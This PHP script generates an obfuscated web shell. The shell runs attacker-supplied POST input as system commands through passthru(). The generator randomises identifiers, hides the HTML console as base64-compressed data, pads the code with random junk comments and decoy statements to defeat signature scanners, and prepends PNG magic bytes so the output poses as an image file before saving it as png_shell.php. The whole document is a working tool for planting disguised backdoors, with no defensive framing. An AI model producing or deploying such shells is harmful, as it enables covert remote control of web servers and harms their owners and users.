<?php
//; exit 1		# in case you did ./rand.php

// are we running from a webserver or terminal?
if ( ! isset($_SERVER['TERM'])){
//	header('Content-Type: text/plain');
}


function make_random_name(){

	// making some randomness
	$name = rand() * rand();
	$name = hash("whirlpool", $name);
	$name = crypt($name, rand());

	// shorten
	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);

	// rm leading numbers
	$name = preg_replace('/^[0-9]+/', '', $name);

	// make sure the regex didn't leave us an empty string
	return ($name = NULL? make_random_name(): $name);
}


$eval_function    = make_random_name();
$eval_arg         = make_random_name();
$html_console_tag = make_random_name();
$post_2233        = make_random_name();
$post_command     = make_random_name();
$script_name      = make_random_name();
$page_html        = make_random_name();
$page_html_var    = make_random_name();
$no_command       = ' ';


function obfust_css($console_tag){
	$css = <<< EOF
			input { background-color: rgb( 255 , 255 , 255 ) ; width: 100% ; }
			* { font-size : 12px ; color : rgb( 0 , 0 , 0 ) ; font-family: monospace !important ; }
			body { background-color : rgb( 250 , 250 , 250 ) ; }
			$console_tag { color : rgb( 170 , 170 , 170 ) ; }
EOF;
	$css=preg_replace('/([ \t\n])/', " ", $css);
	preg_match_all('/ /', $css, $css_array);
	for ($i=0; $i<count($css_array[0]); $i++){
		$css_this_whitespace = ("/*".crypt(rand(),'aaaa')."*/");
		$css = preg_replace('/ /', $css_this_whitespace, $css, 1);
	}
//	$css = preg_replace('/\/\*\*\//', '/*', $css);
//	$css = preg_replace('/\*\/\/\*/', '*/', $css);
	return $css;
}

$css = obfust_css($html_console_tag);

$top_html = <<< EOF
<html>
	<head>
		<style>
		$css
		</style>
EOF;

$page_html = <<< EOF
	</head>
	<body>
		<form--space--action="$script_name"--space--id="form"--space--method="POST">
			<input--space--type="text"--space--name="$post_2233"--space--autocomplete="off"--space--autofocus>
			<span>&nbsp;2&gt;&amp;1&nbsp;</span><button--space--type="submit"--space-->\$\$\$</button>
		</form>
	<code>
<pre>
EOF;
function generate_html_whitespace(){
	/*
	$chance = rand(0,100);
	if ($chance > 90){
		return "\r<!--\n-->";
	}
	else ($chance > 0){
	*/
		//return "                  ";
		return "<!--".crypt(rand(),'aaaa').crypt(rand(),'aaaaa')."-->";
	/*}
	elseif ($chance > 75){
		return " \n\t";
	}
	elseif ($chance > 70){
		return " \t  ";
	}
	else{
		return " ";
	}*/
}
function obfust_html($html){
	$html_whitespace = array();
	$html = preg_replace('/[ \t\n\r]/', '%s', $html);
	preg_match_all('/%s/', $html, $html_whitespace);

	for ($i=0; $i<count($html_whitespace[0]); $i++){
		$html_this_whitespace = generate_html_whitespace();
		$html = preg_replace('/%s/', $html_this_whitespace, $html, 1 );
	}
	return $html;
}
$page_html = $top_html . obfust_html($page_html);
$page_html = preg_replace('/--space--/', ' ', $page_html);
$page_html=base64_encode(gzdeflate($page_html));
$page_html=preg_replace('/([abc\/\+])/', "$1' . '", $page_html);







$shell = sprintf("<?php--space--
$%s = gzinflate(base64_decode( '%s' ) ) ; 

function--space--%s ( $%s ){
	echo--space--     '<%s>$'.\"\\x20\".$%s.'</%s><br>' ;
	echo--space--   passthru($%s.\"\\x20\".'2>&1') ;
      }
@$%s    =    \$_POST['%s']     ;  
echo--space--    preg_replace(     '/%s/' ,       basename(\$_SERVER['SCRIPT_NAME'])    ,    $%s    )    ; 

if (isset( $%s ) ) {
	%s( $%s );
}
else {
	%s(\"\\x20\");
}
__halt_compiler();", 
$page_html_var, $page_html,
$eval_function, $eval_arg, 
	$html_console_tag, $eval_arg, $html_console_tag, 
	$eval_arg, 
$post_command, $post_2233, 
$script_name, $page_html_var, 
$post_command, 
	$eval_function, $post_command, 
	$eval_function);

function generate_whitespace(){
	$chance = rand(0,100);
	if ($chance > 90){
		return "";
	}
	elseif ($chance > 89){
		return " // preg_match_all('\n";
	}
	elseif ($chance > 88){
		$f1 = preg_replace('/=+\//', '', base64_encode(rand()));
		$f2 = preg_replace('/=+\//', '', base64_encode(rand()));
		$f3 = preg_replace('/=+\//', '', base64_encode(rand()));
		return " \n/*r4frshtw';//\nisset($".$f1.")? $".$f2."() :$".$f3."(); \n/**/";
	}
	elseif ($chance > 80){
		return "";
	}
	elseif ($chance > 75){
		return " /*\n*/ ";
	}
	elseif ($chance > 70){
		return "   \t/*\r*/  ";
	}
	elseif($chance > 50){
		return " ";
	}
	elseif($chance > 40){
		$hh = rand(1,20);
		return " /*".
				base64_encode(sprintf(hash_algos()[$hh])).
				base64_encode(sprintf(hash_algos()[($hh+1)])).
				base64_encode(sprintf(hash_algos()[($hh+3)])).
				base64_encode(sprintf(hash_algos()[($hh+4)]))
				."*/  \r";
	}
	elseif($chance > 30){
		return " /*".crypt(rand(),'aaaa').crypt(rand(),'aaaaa')."*/ ";
	}
	elseif($chance > 20){
		return " ";
	}
	elseif($chance > 10){
		return "  ";
	}
	else{
		return " ";
	}
}


$embed = array();
$shell = preg_replace('/[ \t\n\r]/', '%s', $shell);
preg_match_all('/%s/', $shell, $embed);

for ($i=0; $i<count($embed[0]); $i++){
	$whitespace = generate_whitespace();
	$shell = preg_replace('/%s/', $whitespace, $shell, 1 );
}
$shell = preg_replace('/--space--/', ' ', $shell);

$png = sprintf("\x89\x50\x4e\x47\x0d\x0a");
//$png = '';
/*
"\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00\x00\x06\xac".
"\x00\x00\x07\xbc\x08\x06\x00\x00\x00\xc8\xf5\xb1\x8e\x00\x00\x00\x01\x73\x52\x47".
"\x42\x00\xae\xce\x1c\xe9\x00\x00\x01\x9f\x69\x54");
*/
header('Content-Type: text/plain');
$image = $png.$shell;
file_put_contents('./out/png_shell.php', $image);
echo $image;
?>
